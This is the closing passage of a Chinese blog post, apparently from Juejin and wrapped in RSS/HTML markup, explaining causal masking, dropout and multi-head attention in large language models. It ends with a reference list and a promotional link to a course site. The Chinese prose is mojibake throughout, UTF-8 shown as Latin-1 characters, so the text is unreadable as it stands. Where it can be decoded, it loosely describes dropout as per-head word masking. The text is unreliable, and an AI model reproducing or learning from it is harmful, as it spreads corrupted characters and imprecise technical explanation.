<p>å› æœæ©ç è®©å¤§æ¨¡å‹åªè€ƒè™‘å‰é¢çš„å†…å®¹ï¼Œä¸æ˜¯å› ä¸ºåé¢çš„å†…å®¹æ²¡æœ‰ç”¨ï¼Œè€Œæ˜¯å› ä¸ºè®­ç»ƒçš„ç›®æ ‡å°±æ˜¯ä»å‰é¢çš„å†…å®¹ç”Ÿæˆåé¢çš„å†…å®¹ï¼Œæ‰€ä»¥å³ä½¿æœ‰ç”¨ï¼Œåœ¨è¿™ä¸ªè¿è¡Œæœºç†ä¸Šåé¢çš„å†…å®¹å°±æ˜¯ä¸å¯è®¿é—®çš„ï¼Œå¤§æ¨¡å‹å¿…é¡»åœ¨åé¢ä¸å¯çŸ¥çš„æƒ…å†µä¸‹è¿›è¡Œå­¦ä¹ ã€‚</p>
<p>å¦ä¸€ç§æ©ç æ˜¯Â <strong>dropout</strong>ï¼ŒæŒ‡æ¯ä¸ªå¤´éƒ½éšæœºé€‰ä¸€äº›è¯ç›–ä½ï¼Œè®©æ¨¡å‹çš„æ³¨æ„åŠ›èƒ½é›†ä¸­åˆ°æŸäº›è¯ä¸Šã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b0324f3c1ab4a97b2b2f392feb05c92~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769253&amp;x-signature=FX5YEC3ym2rs5FWK8EoqAi3E13s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-5">å¤šå¤´</h2>
<p>å‰é¢ä¹Ÿè¯´æ¯ä¸ªå¤´çš„ QKV çŸ©é˜µéƒ½æ˜¯ä¸ä¸€æ ·ï¼Œå› ä¸ºåœ¨åˆå§‹åŒ– QKV çŸ©é˜µæ—¶æ•°å€¼å°±æ˜¯<strong>éšæœºçš„</strong>ï¼Œé‚£ä¹ˆé€šè¿‡åå‘ä¼ æ’­å¾—åˆ°çš„å€¼å°±ä¸ä¸€æ ·ï¼Œæ‰€ä»¥å„ä¸ªå¤´<strong>æ³¨æ„åˆ°çš„ä¸œè¥¿è‡ªç„¶ä¹Ÿä¸ä¸€æ ·</strong>ã€‚</p>
<p>è™½è¯´äººç±»ä¸å¥½ç†è§£æ³¨æ„åŠ›ï¼Œä½†è¿˜æ˜¯å¯ä»¥é€šè¿‡æ³¨æ„åŠ›å¯è§†åŒ–æ‰¾åˆ°ä¸€äº›æç¤ºï¼Œä¾‹å¦‚æŸäº›å¤´ä¼šå­¦ä¹ åˆ°è¢«åŠ¨è¯­æ€ï¼Œåˆæœ‰æŸäº›å¤´ä¼šå­¦ä¹ åˆ°è¯æ€§åˆ†æã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19fb98cfb3864e5faa3ef87c571456cb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L5pWZ56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765769253&amp;x-signature=S50m6vIWZ9PjRk4xvAgJzb4ukxA%3D" alt="" loading="lazy"/></p>
<p>æœ€åç³»ç»Ÿä¼šæŠŠå¤šä¸ªå¤´çš„ä¿¡æ¯æ±‡æ€»ï¼Œæœ€åè¾“å‡ºåˆ°ä¸‹ä¸€æ­¥ã€‚</p>
<h2 data-id="heading-6">å‚è€ƒèµ„æ–™</h2>
<ul>
<li>â€¢Â ä»é›¶æ„å»ºå¤§æ¨¡å‹</li>
</ul>
<h2 data-id="heading-7">å­¦ä¹ èµ„æºæ¨è</h2>
<p>å¦‚æœä½ æƒ³æ›´æ·±å…¥åœ°å­¦ä¹ å¤§æ¨¡å‹ï¼Œä»¥ä¸‹æ˜¯ä¸€äº›éå¸¸æœ‰ä»·å€¼çš„å­¦ä¹ èµ„æºï¼Œè¿™äº›èµ„æºå°†å¸®åŠ©ä½ ä»ä¸åŒè§’åº¦å­¦ä¹ å¤§æ¨¡å‹ï¼Œæå‡ä½ çš„å®è·µèƒ½åŠ›ã€‚</p>
<blockquote>
<p>æœ¬æ–‡è¾ƒé•¿ï¼Œå»ºè®®ç‚¹èµæ”¶è—ã€‚æ›´å¤šAIå¤§æ¨¡å‹åº”ç”¨å¼€å‘å­¦ä¹ è§†é¢‘åŠèµ„æ–™ï¼Œåœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fhy.zhipoai.cn%2F" target="_blank" title="https://hy.zhipoai.cn/" ref="nofollow noopener noreferrer">æ™ºæ³ŠAI</a>ã€‚</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>